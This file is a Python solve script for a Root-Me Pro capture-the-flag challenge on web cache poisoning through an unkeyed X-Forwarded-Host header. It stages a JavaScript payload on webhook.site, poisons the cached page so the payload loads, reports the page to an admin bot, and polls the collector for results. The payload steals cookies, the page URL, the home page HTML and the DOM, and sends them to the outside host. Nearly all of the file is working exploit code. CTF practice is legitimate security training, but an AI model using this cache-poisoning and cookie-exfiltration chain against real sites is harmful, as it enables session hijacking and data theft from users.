#!/usr/bin/env python3
"""
Root-Me Pro - Web Cache Poisoning - Unkeyed HTTP Header  (v2, unambiguous)

Usage:
    python3 solve2.py https://instance-<id>.challenges.root-me.pro

Fixes over v1:
  * Mints a FRESH webhook token every run, so the collector log contains ONLY
    this run's traffic -- no more confusing old curl/requests/bot fetches with
    the current attempt.
  * Prints timestamps and separates "script fetched" from real callbacks.
  * Payload fires /hello FIRST (proves execution), then exfils, then falls back
    to a top-level navigation, which is the most reliable exfil in a headless
    browser that tears the page down quickly.
  * Dumps the poisoned page's response headers so a CSP (which would silently
    stop execution) is visible.
  * Also checks "/" directly for the flag, in case the app reveals it there
    once the admin has been successfully attacked.
"""
import json
import random
import re
import sys
import time
import urllib.parse

import requests

SCRIPT_PATH = "/static/js/confettis_manager.js"

PAYLOAD = """
var u="{uuid}";
function send(p,d){{
  try{{var x=new XMLHttpRequest();x.open("GET","https://webhook.site/"+u+"/"+p+"?"+d,false);x.send();return 1;}}
  catch(e){{try{{new Image().src="https://webhook.site/"+u+"/"+p+"img?"+d;}}catch(e2){{}}return 0;}}
}}
send("hello","t="+Date.now());
var c="";
try{{c=document.cookie;}}catch(e){{c="cookie-err:"+e.message;}}
send("x","c="+encodeURIComponent(c)+"&loc="+encodeURIComponent(location.href));
try{{
  var h=new XMLHttpRequest();h.open("GET","/",false);h.send();
  send("home","d="+encodeURIComponent(h.responseText.slice(0,2500)));
}}catch(e){{send("err","e="+encodeURIComponent(e.message));}}
send("dom","d="+encodeURIComponent(document.documentElement.innerHTML.slice(0,2500)));
/* last resort: a real navigation always leaves the browser */
try{{location="https://webhook.site/"+u+"/nav?c="+encodeURIComponent(c);}}catch(e){{}}
"""

FLAG_RE = re.compile(r"RM\{[^}]{1,200}\}")


def mint():
    uuid = requests.post("https://webhook.site/token", json={}, timeout=20).json()["uuid"]
    print(f"[*] fresh collector: https://webhook.site/#!/{uuid}")
    return uuid


def configure(uuid):
    requests.put(
        f"https://webhook.site/token/{uuid}",
        json={
            "default_content": PAYLOAD.format(uuid=uuid),
            "default_content_type": "application/javascript",
            "default_status": 200,
        },
        timeout=20,
    ).raise_for_status()
    r = requests.get(f"https://webhook.site/{uuid}{SCRIPT_PATH}", timeout=20)
    assert "javascript" in r.headers.get("content-type", ""), r.headers
    print(f"[+] payload staged as {r.headers['content-type']}")


def poison(target, path, uuid):
    marker = f"//webhook.site/{uuid}{SCRIPT_PATH}"
    r = requests.get(target + path, headers={"X-Forwarded-Host": f"webhook.site/{uuid}"}, timeout=20)
    print(f"[+] poison x-cache={r.headers.get('x-cache')}")
    assert marker in r.text, "reflection failed"

    v = requests.get(target + path, timeout=20)
    print(f"[+] verify x-cache={v.headers.get('x-cache')}")
    assert marker in v.text, "cache NOT poisoned - retry"
    print("[+] unkeyed header confirmed - poisoned copy served without the header")

    # A CSP here would explain a fetched-but-never-executed script.
    print("[*] poisoned page headers:")
    for k, val in v.headers.items():
        if k.lower() in ("content-security-policy", "x-content-type-options", "x-cache",
                         "cache-control", "vary", "server"):
            print(f"      {k}: {val}")


def report(target, path):
    r = requests.post(target + "/report", data={"path": path}, timeout=25)
    assert "has been sent" in r.text, "report rejected"
    print(f"[+] reported {path}")


def poll(uuid, target, tries=30, delay=5):
    seen, scripts = set(), 0
    for i in range(1, tries + 1):
        time.sleep(delay)
        data = requests.get(
            f"https://webhook.site/token/{uuid}/requests",
            params={"sorting": "newest", "per_page": 50},
            timeout=20,
        ).json()
        for req in data.get("data", []):
            if req["uuid"] in seen:
                continue
            seen.add(req["uuid"])
            ua = (req.get("headers", {}).get("user-agent") or [""])[0]
            url = req.get("url", "")
            when = req.get("created_at")
            if SCRIPT_PATH in url:
                scripts += 1
                who = "HEADLESS-BOT" if "Headless" in ua else "us/verification"
                print(f"    [{when}] script fetched ({who})")
                continue
            print(f"\n[!] CALLBACK [{when}] {req.get('method')} {url[:110]}")
            q = req.get("query") or {}
            for k, v in q.items():
                print(f"    --- {k} ---\n    {urllib.parse.unquote(str(v))[:2500]}")
            flags = FLAG_RE.findall(urllib.parse.unquote(json.dumps(q)))
            if flags:
                return flags
        print(f"    poll {i}/{tries} (script fetches so far: {scripts})")

    print("\n[-] no callback.")
    print("    script fetched by a HEADLESS bot? -> if yes, JS was served but did not execute")
    print("       (check the CSP line above); if no, the bot never loaded the poisoned page.")
    return None


def check_index(target):
    """Maybe the app just reveals the flag once the admin has been hit."""
    r = requests.get(f"{target}/?username=check{random.randint(1000,9999)}", timeout=20)
    return FLAG_RE.findall(r.text)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    target = sys.argv[1].rstrip("/")

    uuid = mint()
    configure(uuid)

    path = f"/?username=pwn{random.randint(10000, 99999)}"
    print(f"[*] victim path: {path}")
    poison(target, path, uuid)
    report(target, path)

    flags = poll(uuid, target) or check_index(target)
    for f in set(flags or []):
        print(f"\n[+++] FLAG: {f}")
